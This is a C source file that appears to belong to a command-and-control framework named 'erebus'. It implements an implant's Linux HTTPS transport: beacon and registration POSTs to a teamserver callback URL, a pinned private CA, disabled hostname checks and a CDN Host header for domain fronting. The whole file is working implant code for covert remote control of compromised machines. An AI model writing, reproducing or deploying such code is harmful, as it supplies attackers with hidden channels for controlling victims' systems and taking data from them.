/*
 * Linux HTTPS transport via libcurl with pinned teamserver CA.
 * Matches Go implant contract: POST /register and /beacon, octet-stream body.
 */
#include <curl/curl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "erebus/config.h"
#include "erebus/crypto.h"
#include "erebus/transport.h"

typedef struct {
    char base_url[512];
    char cdn_host_hdr[300];
} https_linux_ctx;

typedef struct {
    uint8_t *data;
    size_t   len;
    size_t   cap;
} mem_buf;

static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t n = size * nmemb;
    mem_buf *b = (mem_buf *)userdata;
    if (b->len + n > (1 << 20)) return 0;
    if (b->len + n > b->cap) {
        size_t ncap = b->cap ? b->cap * 2 : 4096;
        while (ncap < b->len + n) ncap *= 2;
        uint8_t *p = (uint8_t *)realloc(b->data, ncap);
        if (!p) return 0;
        b->data = p;
        b->cap = ncap;
    }
    memcpy(b->data + b->len, ptr, n);
    b->len += n;
    return n;
}

/* Build PEM from base64 DER in config (same as Windows C implant embedding). */
static char *ca_pem_from_config(void) {
    if (EREBUS_CA_CERT_PEM[0] == '\0') return NULL;
    uint8_t *der = NULL;
    size_t der_len = 0;
    if (!erebus_b64_decode(EREBUS_CA_CERT_PEM, &der, &der_len) || !der || !der_len)
        return NULL;

    /* PEM-encode DER */
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    size_t b64_len = 4 * ((der_len + 2) / 3);
    char *body = (char *)malloc(b64_len + 1);
    if (!body) { free(der); return NULL; }
    size_t o = 0;
    for (size_t i = 0; i < der_len; i += 3) {
        unsigned v = der[i] << 16;
        if (i + 1 < der_len) v |= der[i + 1] << 8;
        if (i + 2 < der_len) v |= der[i + 2];
        body[o++] = b64[(v >> 18) & 63];
        body[o++] = b64[(v >> 12) & 63];
        body[o++] = (i + 1 < der_len) ? b64[(v >> 6) & 63] : '=';
        body[o++] = (i + 2 < der_len) ? b64[v & 63] : '=';
    }
    body[o] = '\0';
    free(der);

    size_t pem_cap = o + 128 + (o / 64) * 2;
    char *pem = (char *)malloc(pem_cap);
    if (!pem) { free(body); return NULL; }
    size_t p = 0;
    p += (size_t)snprintf(pem + p, pem_cap - p, "-----BEGIN CERTIFICATE-----\n");
    for (size_t i = 0; i < o; i += 64) {
        size_t chunk = (o - i > 64) ? 64 : (o - i);
        memcpy(pem + p, body + i, chunk);
        p += chunk;
        pem[p++] = '\n';
    }
    p += (size_t)snprintf(pem + p, pem_cap - p, "-----END CERTIFICATE-----\n");
    free(body);
    return pem;
}

static int https_post(https_linux_ctx *ctx, const char *path,
    const uint8_t *body, size_t body_len, uint8_t **resp, size_t *resp_len) {
    if (strncmp(ctx->base_url, "https://", 8) == 0 && EREBUS_CA_CERT_PEM[0] == '\0')
        return 0;

    char url[640];
    snprintf(url, sizeof(url), "%s%s", ctx->base_url, path);

    CURL *curl = curl_easy_init();
    if (!curl) return 0;

    mem_buf mb = {0};
    struct curl_slist *hdrs = NULL;
    hdrs = curl_slist_append(hdrs, "Content-Type: application/octet-stream");
    if (ctx->cdn_host_hdr[0])
        hdrs = curl_slist_append(hdrs, ctx->cdn_host_hdr);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, hdrs);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)body_len);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &mb);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);

    char *ca_pem = NULL;
    if (strncmp(ctx->base_url, "https://", 8) == 0) {
        ca_pem = ca_pem_from_config();
        if (!ca_pem) {
            curl_slist_free_all(hdrs);
            curl_easy_cleanup(curl);
            return 0;
        }
#if LIBCURL_VERSION_NUM >= 0x074B00
        struct curl_blob blob;
        blob.data = ca_pem;
        blob.len = strlen(ca_pem);
        blob.flags = CURL_BLOB_COPY;
        curl_easy_setopt(curl, CURLOPT_CAINFO_BLOB, &blob);
#else
        /* Fallback: write temp PEM file */
        char tmp[] = "/tmp/erebus-ca-XXXXXX";
        int fd = mkstemp(tmp);
        if (fd < 0) { free(ca_pem); curl_slist_free_all(hdrs); curl_easy_cleanup(curl); return 0; }
        write(fd, ca_pem, strlen(ca_pem));
        close(fd);
        curl_easy_setopt(curl, CURLOPT_CAINFO, tmp);
        /* unlink after perform */
        curl_easy_setopt(curl, CURLOPT_PRIVATE, strdup(tmp));
#endif
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); /* private CA / fronting; pin is CA */
    }

    CURLcode rc = curl_easy_perform(curl);
    long code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &code);

#if LIBCURL_VERSION_NUM < 0x074B00
    char *priv = NULL;
    curl_easy_getinfo(curl, CURLINFO_PRIVATE, &priv);
    if (priv) { unlink(priv); free(priv); }
#endif

    curl_slist_free_all(hdrs);
    curl_easy_cleanup(curl);
    free(ca_pem);

    if (rc != CURLE_OK || code != 200) {
        free(mb.data);
        return 0;
    }
    *resp = mb.data;
    *resp_len = mb.len;
    return 1;
}

static int https_register(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    return https_post((https_linux_ctx *)t->ctx, "/register", req, req_len, resp, resp_len);
}

static int https_beacon(erebus_transport *t, const uint8_t *req, size_t req_len, uint8_t **resp, size_t *resp_len) {
    return https_post((https_linux_ctx *)t->ctx, "/beacon", req, req_len, resp, resp_len);
}

static void https_destroy(erebus_transport *t) {
    free(t->ctx);
    free(t);
}

static const erebus_transport_ops https_ops = {
    https_register,
    https_beacon,
    https_destroy,
    NULL, /* set_session_id: HTTPS does not store session in transport ctx */
};

static void erebus_curl_global_once(void) {
    static int done = 0;
    if (done) return;
    /* Single-threaded implant: simple flag is enough (no pthread dependency). */
    if (!done) {
        curl_global_init(CURL_GLOBAL_DEFAULT);
        done = 1;
    }
}

int erebus_transport_create_https(erebus_transport **out) {
    erebus_curl_global_once();
    erebus_transport *t = (erebus_transport *)calloc(1, sizeof(*t));
    https_linux_ctx *ctx = (https_linux_ctx *)calloc(1, sizeof(*ctx));
    if (!t || !ctx) { free(t); free(ctx); return 0; }

    const char *url = EREBUS_CALLBACK_URL;
    if (!url[0]) url = "https://127.0.0.1:443";
    /* strip trailing slash */
    size_t n = strlen(url);
    while (n > 0 && url[n - 1] == '/') n--;
    if (n >= sizeof(ctx->base_url)) n = sizeof(ctx->base_url) - 1;
    memcpy(ctx->base_url, url, n);
    ctx->base_url[n] = '\0';

    if (EREBUS_CDN_DOMAIN[0])
        snprintf(ctx->cdn_host_hdr, sizeof(ctx->cdn_host_hdr), "Host: %s", EREBUS_CDN_DOMAIN);

    t->ops = &https_ops;
    t->ctx = ctx;
    *out = t;
    return 1;
}
